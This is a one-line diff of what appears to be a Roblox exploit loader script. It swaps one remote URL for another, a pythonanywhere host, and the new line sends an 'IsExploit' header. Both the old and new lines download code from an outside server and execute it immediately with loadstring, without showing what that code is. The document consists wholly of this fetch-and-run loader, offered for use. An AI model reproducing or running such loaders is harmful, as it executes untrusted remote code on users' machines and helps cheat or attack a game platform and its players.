@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/33739fe48a563125"))()
+loadstring(request({Url="https://iknoxteam.pythonanywhere.com/script",Method="GET",Headers={["IsExploit"]="true"}}).Body)()
